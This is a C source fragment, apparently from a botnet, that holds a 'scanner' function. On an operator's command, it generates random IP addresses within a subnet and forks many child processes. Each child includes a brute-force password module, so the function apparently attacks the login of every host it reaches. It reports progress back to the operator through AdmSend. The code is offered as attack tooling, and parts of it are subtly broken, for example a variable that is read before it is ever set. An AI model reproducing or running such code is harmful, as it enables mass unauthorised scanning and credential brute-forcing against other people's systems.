void scanner(char *s){

	if (running == 1) {
		AdmSend("[SCAN RUNNING!!!]\n");
		return;
	}
	char *sender;
	char *temp;
	char *choice;
	char *ip_ptr;
	int a,b,c,d;
	char ip[20];
	unsigned long secs;
	time_t startx=time(NULL);
	int maxchilds=0,status,pgid;
	char *subnet = NULL;
	int sub =0;
	pid_t pid;
	time_t my_time;
	time(&my_time);
	struct tm * time_real; 
	time_real = localtime (&my_time);
	struct timespec start, end;
	double start_sec, end_sec, elapsed_sec;
	clock_gettime(CLOCK_REALTIME, &start);
	int n;
	char i1[128]= "", i2[128]= "", i3[128]= "";

	char *text = s;

	sscanf(text, "%s %s %s", &i1, &i2, &i3);

	temp=i1;
	int mc = atoi(i2);
	maxchilds=mc;


	int ss = atoi(i3);
	secs=ss;
	running=1;

	time_real = localtime(&my_time);
	AdmSend("%s\n[ RANDOMSCAN STARTED ]SUBNET[ %s ]THREADS[ %s ]TIME[ %s ]\n",asctime(time_real),i1,i2,i3);

	if (mfork() != 0) return;
	if(pid == 0) {

		while(1){
			if(time(NULL) >= startx+secs * 60){
				running=0;
				time(&my_time);
				time_real = localtime(&my_time);
				AdmSend("%s\n[ WAITING OF THREADS ]\n",asctime(time_real));
				wait(&status);
				while (--childs) wait(NULL);
				kill((pid_t) getppid(), SIGTERM);
				time(&my_time);
				time_real = localtime(&my_time);
				AdmSend("%s\n[ SCAN DONE ]\n",asctime(time_real));

				break;
			}

			//////////////////RIPPED by rbot thx nils`//////////////////////
			int ip1,ip2,ip3,ip4;
			if (strlen(temp)>15) return;
			ip1=-1;ip2=-1;ip3=-1;ip4=-1;
			sscanf(temp,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
			if (ip1==-1) ip1=rand()%255;
			if (ip2==-1) ip2=rand()%255;
			if (ip3==-1) ip3=rand()%255;
			if (ip4==-1) ip4=rand()%255;
			///////////////////////////////////////////////////////////////

			if (childs >= maxchilds) wait(NULL);
			(void) sprintf(ip, "%d.%d.%d.%d",ip1,ip2,ip3,ip4);


			switch(fork()) {
				case 0:
#include "../BruteForce/Pass.c"
					exit(0);
				case -1 :
					exit(1);
				default:
					++childs;
					break;
			}
		}



	}else{

		while (--childs) wait(NULL);
	}
	clock_gettime(CLOCK_REALTIME, &end);
	start_sec = start.tv_sec + start.tv_nsec/NANO_PER_SEC;
	end_sec = end.tv_sec + end.tv_nsec/NANO_PER_SEC;
	elapsed_sec = end_sec - start_sec;
	AdmSend("The operation took %.3f seconds\n", elapsed_sec);

}


